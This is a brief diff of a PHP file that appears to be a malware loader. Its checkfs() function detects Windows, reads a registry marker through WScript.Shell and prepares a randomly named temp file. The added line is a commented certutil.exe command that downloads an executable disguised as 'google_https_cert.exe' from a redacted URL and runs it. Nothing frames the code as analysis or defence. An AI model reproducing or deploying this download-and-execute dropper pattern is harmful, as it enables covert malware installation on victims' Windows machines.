@@ -6,6 +6,7 @@ define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
+        //certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe
         $wh = new COM('WScript.Shell');
         if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
             $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
